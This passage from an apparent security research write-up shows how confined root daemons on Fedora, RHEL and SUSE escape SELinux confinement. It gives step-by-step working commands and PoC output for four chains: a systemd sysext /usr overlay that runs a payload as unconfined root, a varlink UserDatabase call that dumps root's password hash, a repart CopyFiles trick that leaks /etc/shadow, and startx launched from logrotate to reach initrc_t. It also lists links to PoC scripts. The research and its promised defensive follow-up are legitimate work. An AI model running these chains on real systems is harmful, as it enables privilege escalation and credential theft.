The resulting `linnemanlabs-poc.raw` can be gzip compressed down to ~15 KB. Stage that file on the target system under `/run/extensions/linnemanlabs-poc.raw`:

```bash
$ id -Z
system_u:system_r:ipsec_mgmt_t:s0

ls -Z /run/extensions/linnemanlabs-poc.raw
system_u:object_r:ipsec_mgmt_var_run_t:s0 /run/extensions/linnemanlabs-poc.raw
```

Now call varlink sysext.Merge with no arguments and it will merge everything in the search dir and the overlay mount will show up:

```bash
$ id -Z
system_u:system_r:ipsec_mgmt_t:s0

$ varlinkctl call /run/systemd/io.systemd.sysext io.systemd.sysext.Merge '{}'

$ mount -l -t overlay
sysext on /usr type overlay (ro,nodev,relatime,seclabel,lowerdir=/run/systemd/sysext/meta/usr:/run/systemd/sysext/extensions/linnemanlabs-poc/usr:/usr,redirect_dir=on)
```

Note that the mount does not carry `nosuid` so you could plant an SUID binary. The `seclabel` option means it will carry the label we set on the binary, which is why we crafted the image off-site to set a desired label.

The last step for this example is calling the d-bus service to activate the service and run our overlaid binary:

```bash
$ id -Z
system_u:system_r:ipsec_mgmt_t:s0

$ busctl call org.freedesktop.realmd / org.freedesktop.DBus.Peer Ping
Call failed: Connection timed out
```

The call failed is expected, our shellscript doesn't respond to D-Bus messages but it is executed. Confirmation:

```bash
$ cat /tmp/sysext.id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0

$ grep -E "^Cap(Eff|Bnd)" /tmp/sysext.status 
CapEff: 000001f3f5fcffff
CapBnd: 000001f3f5fcffff
```

You could pick any other service, or any other file under `/usr` or `/opt`. There are too many techniques to list. This approach is just a simple example.

PoC available at end:

```bash
$ id -Z
system_u:system_r:ipsec_mgmt_t:s0

$ bash sysext-overlay.sh /var/lib/ipsec/nss/linnemanlabs-sysext-poc.b64
[*] staged /run/extensions/linnemanlabs-sysext-poc.raw
[+] merged - /usr now has our unit and the .wants -> us
[*] systemd-localed.service is cold - activating org.freedesktop.locale1 to pull our unit
[+] fired via systemd-localed.service - payload ran:
    uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
    CapInh:     0000000000000000
    CapPrm:     000001ffffffffff
    CapEff:     000001ffffffffff
    CapBnd:     000001ffffffffff
    CapAmb:     0000000000000000
[*] cleanup: unmerged /usr overlay
```

#### bluetooth_t wall

You may have noticed I used `ipsec_mgmt_t` in this example instead of `bluetooth_t` I use everywhere else. The reason is actually interesting. `bluetooth_t` can create a file in /run, and it can create a `/run/extensions/x.img`, but the directory does not exist by default, and bluetooth_t cannot create it. If the directory already existed then bluetooth_t could write to it and this path is open.

It stores state in `/var/lib/bluetooth`, and it has SELinux grants to create `/var/lib/extensions`, but it runs under `ProtectSystem=strict` on all tested distros, which mounts `/var` read-only with only `/var/lib/bluetooth` read-write. It drops CAP_SYS_PTRACE or else we could still create it through /proc/1/root/var/lib/extensions. You really have to measure every individual domain and escape at each step.

Walled off on 2 separate paths by 2 separate restrictions. A missing SELinux grant to make a folder under /run on one path, and a read-write /var due to systemd protections on the other path. 

Genuinely spent a lot of time and effort on this and it is one of the biggest hurdles I hit. Whoever wrote the policy that intentionally left out `:dir create` on the bluetooth_t grants - it paid off today. Not a real wall, you just have to recruit another service to make the directory for you.

### UserDatabase

`bluetooth_t` is forbidden from reading `shadow_t` by SELinux and it lacks caps+DAC permissions to read `/etc/shadow`, but it can connect to the `UserDatabase` varlink socket and call `GetUserRecord`. The field `hashedPassword` is populated for a privileged caller, where "privileged" is decided by `SO_PEERCRED` - uid with no SELinux check. So the confined foothold gets any user's hash including root anyway, because `systemd-userdbd` reads shadow as itself and hands it back:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:bluetooth_t:s0

$ cat /etc/shadow
cat: /etc/shadow: Permission denied

$ varlinkctl call /run/systemd/userdb/io.systemd.Multiplexer \
    io.systemd.UserDatabase.GetUserRecord '{"userName":"root","service":"io.systemd.Multiplexer"}'
{
        "record" : {
                "userName" : "root",
                "uid" : 0,
                ...
                "privileged" : {
                        "hashedPassword" : [
                                "$y$j9T$EGezHjR0BpHwO/4lShe8P.$8Aklx7aDIPLp0hXefVWhmmoVPQbIMTitSf01kUMAim1"
                        ]
                },
        },
        "incomplete" : false
}

$ varlinkctl call /run/systemd/userdb/io.systemd.Multiplexer \
    io.systemd.UserDatabase.GetUserRecord '{"userName":"testuser","service":"io.systemd.Multiplexer"}' 
{
        "record" : {
                "userName" : "testuser",
                "uid" : 1004,
                ...
                "privileged" : {
                        "hashedPassword" : [
                                "$y$j9T$VqEwT7xSg7VN9b7C67wbe1$/gzPdoMN9wn/sDF1f9OAj77oQfa/d.xZgYRcGSNXYKD"
                        ]
                },
        },
        "incomplete" : false
}
```

PoC available at end:

```bash
$ id -Z
context=system_u:system_r:bluetooth_t:s0

$ bash varlink-userdatabase.sh
[+] root hash: $y$j9T$EGezHjR0BpHwO/4lShe8P.$8Aklx7aDIPLp0hXefVWhmmoVPQbIMTitSf01kUMAim1
```

### Repart

systemd-repart is a `Dynamic Disk Images` tool for creating/adding/growing partitions and creating DDIs. You can read the [systemd-repart docs](https://www.freedesktop.org/software/systemd/man/latest/systemd-repart.html) for detailed info. It exposes a varlink interface at `io.systemd.Repart` as of systemd 259.

There are several interesting uses of repart. It is not a direct unconfined exec path - it is another example of borrowing authority. For this article I will use it as an arbitrary file read. When creating DDIs, we can specify a `CopyFiles` option that copies files from the host filesystem to our block device. These files can be staged anywhere you have write access to create, the service runs as unconfined_service_t and will be able to read most types. I will use `bluetooth_t` for this example.

The easy and classic PoC is to read `/etc/shadow`. First, create a file for repart to operate on. Depending how large the file you want to read is, ensure this is large enough to contain it:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ mkdir -p /var/lib/bluetooth/rp/defs

$ dd if=/dev/zero of=/var/lib/bluetooth/rp/leakfs bs=1000000 count=48
```

Now create the repart configuration file. This will copy `/etc/shadow` from the host filesystem to `/shadow-leaked` on the ext4 filesystem it creates on `/var/lib/bluetooth/rp/leakfs`:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ printf "[Partition]\nType=linux-generic\nFormat=ext4\nSizeMinBytes=16M\nCopyFiles=/etc/shadow:/shadow-leaked\n" > /var/lib/bluetooth/rp/defs/10.conf
```

Call the `io.systemd.Repart.Run` varlink interface which reads our config, builds the image, and copies in /etc/shadow:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ varlinkctl call /run/systemd/io.systemd.Repart io.systemd.Repart.Run '{"node":"/var/lib/bluetooth/rp/leakfs","empty":"force","dryRun":false,"definitions":["/var/lib/bluetooth/rp/defs"]}'
```

bluetooth_t lacks permissions to actually create a block device and mount the disk image file. You could use a helper to create a loop device from the file, and mount it, and read the file through like we have done other places in the article. Or you could just grep the root entry from the disk image:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ strings /var/lib/bluetooth/rp/leakfs | grep ^root:
root:$y$j9T$EGezHjR0BpHwO/4lShe8P.$8Aklx7aDIPLp0hXefVWhmmoVPQbIMTitSf01kUMAim1:20665::::::
```
PoC available at end:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ bash repart-read.sh /etc/shadow /var/lib/bluetooth/new
[*] creating /var/lib/bluetooth/new/defs and staging /var/lib/bluetooth/new/defs/10.conf
[*] creating image /var/lib/bluetooth/new/leakfs for repart to write DDI to
[*] calling Repart Varlink to create DDI with /etc/shadow
[+] leaked from /etc/shadow:
    root:$y$j9T$EGezHjR0BpHwO/4lShe8P.$8Aklx7aDIPLp0hXefVWhmmoVPQbIMTitSf01kUMAim1:20665::::::
```

## startx

On a system with xorg-x11-xinit installed `startx` is a clean example of the direct exec transition lane.

`/usr/bin/startx` is a shellscript labeled `initrc_exec_t` and it executes an X server that you can choose through $XSERVERRC (or $HOME/.xserverrc, or the -- &lt;server&gt; arg). By pointing that to our own script startx transitions through `initrc_exec_t` ->  `initrc_t` -> runs our script as unconfined root. startx times out trying to connect to the display but our script executes first. No monitor actually required, just need startx installed.

I will use `logrotate` for the example as it is one of the few domains that is eligible and also a domain I frequently find myself landing in (file write -> exec shown earlier). `logrotate_t` carries a transition from initrc_exec_t to initrc_t:

```bash
$ ls -Z /usr/bin/startx
system_u:object_r:initrc_exec_t:s0 /usr/bin/startx

$ sesearch -A -T -s logrotate_t -t initrc_exec_t -c process
type_transition logrotate_t initrc_exec_t:process initrc_t;

$ sesearch -A -s logrotate_t -t initrc_t -c process -p transition
allow logrotate_t initrc_t:process transition;
```

Write the payload that we will pass in as the "X server":

```bash
$ id -Z
system_u:system_r:logrotate_t:s0

printf '#!/bin/sh\nid -Z > /var/lib/logrotate/startx.id\ncat /proc/self/status > /var/lib/logrotate/startx.status\nexit 0\n' > /var/lib/logrotate/x
chmod 755 /var/lib/logrotate/x
```

Call startx from the logrotate environment:

```bash
$ id -Z
system_u:system_r:logrotate_t:s0

$ HOME=/var/lib/logrotate timeout 8 /usr/bin/startx -- /var/lib/logrotate/x >/dev/null 2>&1; true
```

The simplest real-world test to perform that execution from within logrotate is to create a /etc/logrotate.d/x configuration, write a log, fire logrotate:

```bash
cat | sudo tee /etc/logrotate.d/x <<'EOF'
/var/log/x.log {
    size 0
    ifempty
    missingok
    copytruncate
    nodateext
    postrotate
        HOME=/var/lib/logrotate XSERVERRC=/var/lib/logrotate/x /usr/bin/startx -- /var/lib/logrotate/x >/dev/null 2>&1 || true
    endscript
}
EOF

$ sudo touch /var/log/x.log

$ sudo systemctl start logrotate
```

Check our output files:

```bash
$ cat /var/lib/logrotate/startx.id
system_u:system_r:initrc_t:s0

$ grep -E "^Cap(Eff|Bnd)" /var/lib/logrotate/startx.status 
CapEff: 000001f3f5fcffff
CapBnd: 000001f3f5fcffff
```

`initrc_t` is a very privileged domain and has `setenforce`, `load_policy`, `setbool` grants. Write a systemd unit file and start a new service with full caps and no confinement. logrotate runs with `ProtectSystem=full` but retains CAP_SYS_PTRACE, so just write through /proc/1/root/etc/systemd or write it to /run and start it.

## Proofs of Concept

For each individual technique used above.

| Technique | PoC | Works from |
| --- | --- | --- |
| [PackageKit](#packagekit) | [packagekit.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/packagekit.sh) | Any uid-0 daemon reaching the D-Bus fleet (297 confined daemons) |
| [KAuth helpers](#19-kde-entry-points) | [kauthclient](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/kauthclient/) | Same fleet on systems with KAuth (KDE) |
| [kpmcore](#kpmcore) | [kpmcore.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/kpmcore.sh) | Same fleet, on systems with kpmcore (KDE) |
| [kio.admin](#kioadmin) | [kioadmin.py](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/kioadmin.py) | Same fleet, on systems with kio-admin (KDE) |
| [Blivet mount](#blivet) | [blivet-mount.py](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/blivet-mount.py) | Same fleet |
| [UDisks overlay](#udisks2) | [udisks-overlay.py](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/udisks-overlay.py) | Same fleet on systems with UDisks2 |
| [systemd activation pull](#want-link-enable) | [activation-pull.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/activation-pull.sh) | Same fleet, needs eligible pivot service |
| [environment poisoning](#env-poisoning) | [env-poison.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/env-poison.sh) | Domains with `system:reload` (31) |
| [sysext overlay](#sysext-overlay) | [sysext](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/sysext/) | uid-0 that can create the search dir (206) |
| [UserDatabase](#userdatabase) | [varlink-userdatabase.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/varlink-userdatabase.sh) | Any uid-0 daemon reaching the userdb varlink (612) |
| [Repart](#repart) | [repart-read.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/repart-read.sh) | Any uid-0 daemon reaching the Repart varlink (586) |
| [startx](#startx) | [startx.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/startx.sh) | `logrotate_t`, `NetworkManager_t` (+ startx installed) |

Tools to support the above PoCs.

| Tool | Purpose |
| --- | --- |
| [cold-activatable-services.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/cold-activatable-services.sh) | Enumerate what systemd units a confined daemon can reach over D-Bus to activate. Used when creating new systemd units (link our unit as a dependency) or for the environment poisoning technique. |

## Tested Versions

I tested against Fedora 44 Plasma, RHEL 9 Workstation, RHEL 10 Workstation, RHEL10 Server, SUSE SLES16, openSUSE Leap 16 KDE.

| OS | systemd | selinux-policy | libselinux | Window Manager |
|---|---|---|---|---|
| Fedora 44 Plasma          | 259 | 44.4-1.fc44               | 3.10 | KDE Plasma 6.7.3 |
| RHEL 10.2 (Workstation)   | 257 | 42.1.18-4.el10_2.1        | 3.10 | GNOME Shell 49.4 |
| RHEL 10.2 (Server)        | 257 | 42.1.18-4.el10_2.1        | 3.10 | - |
| RHEL 9.8 (Workstation)    | 252 | 38.1.75-2.el9_8           | 3.6  | GNOME Shell 40.10 |
| SUSE SLES 16              | 257 | 20250627+git385.2b2068bc0 | 3.81 | - |
| openSUSE LEAP 16          | 257 | 20250627+git385.2b2068bc0 | 3.81 | KDE Plasma 6.4.2 |

The majority of my in-depth research was done on Fedora 44. I then tested to re-create everything on each OS in the table above to confirm portability, which is what is documented.

| Technique | Fed 44 | RHEL 10 | RHEL 9 | Leap 16 | SLES 16 |
| --- | --- | --- | --- | --- | --- |
| PackageKit `%post` -> `rpm_t` | x | x | x | x | |
| KAuth (KDE helpers) | x | | | x | |
| Blivet | x | | | | |
| UDisks2 (loop-mount / fstab write) | x | x | x | x | |
| Unit-file writers + activation-pull | x | x | x | x | x |
| `SetEnvironment` env-poison | x | x | x | x | x |
| sysext `/usr` overlay | x | x | | x | x |
| Repart (arbitrary read) | x | | | | |
| UserDatabase hash-read | x | x | | disable | disable |
| startx -> `initrc_t` | x | | x |  | |
| `/proc/1/root` sandbox bypass | x | x | | x | x |

All the empty cells are because the component is not installed or the systemd version is too old. 

UserDatabase on SUSE is the interesting exception that is an intentional hardening. Fedora/RHEL use systemd's default preset but SUSE ships their own presets with a default `disable *` and they opt-in to interfaces they want, and they did not choose to opt-in to UserDatabase. 

## Prior Art

I researched and developed these chains independently. Many ingredients are established behavior, and related work exists for systemd environment poisoning, using privileged D-Bus helpers, and attacker-controlled mounts in general.

For most of the exact SELinux/systemd confined-root chains described here, I found no prior public documentation. Related work is cited with the relevant sections. Reach out if I should add anyone.

---

## Closing Thoughts

These techniques are all basically a collection of gadgets. A domain, a helper, a launcher, a mount view, a consumer - it's all a large graph with any number of paths at each hop. The constraints and confinement vary every time you use another gadget. If you take the time to look at the edges between them most confined root daemons reach unconfined, usually several different ways. They are each individually worth understanding at depth and not just running a PoC. Enumerate the graph, not the grant.

I am not trying to demonstrate every possible chain here but show how to measure a foothold. A uid-0 daemon's blast radius isn't its own SELinux grants and systemd confinement, it's the authority it can reach: every deputy, launcher, mount service, and consumer one D-Bus call away. bluetooth_t on paper is a very tightly confined daemon. bluetooth_t plus the unconfined helpers it can message is unconfined root.

Most of the components in these chains are individually working as intentionally designed. Some of the auth gaps might be bugs, but the overall escape concept doesn't require any one component to be broken. polkit approves uid 0 because root is an administrator. systemd runs your unit as init_t because that's its entire job. The overall concept doesn't rely on any single component being broken. The danger lives in the seam between such a complex interaction of systems and permission models that are each individually correct but compose into these chains.

SELinux confines the daemon's direct actions, polkit authorizes the operation, the deputy performs it - and no one owns the composition. Which is the whole point of the post. A confined root daemon's containment is real for what it does directly, and largely illusory for what it can reach. Confined root is still root.

## What's Next

There is a lot of bespoke and complex interactions going on here between systemd unit files/cache/dependencies/state, systemd hardening options, SELinux domains and labels and transitions, LSM hooks, DAC, IPC over D-Bus and Varlink, process capabilities, helper processes that launder transactions and their configs, mount/user/process namespaces, filesystem overlays, etc.

That complexity carries over to the defender side, and the detection and prevention rules get equally sophisticated. The next article analyzes these chains from the defender’s side: removing dangerous authority edges and detecting the operations that remain.

---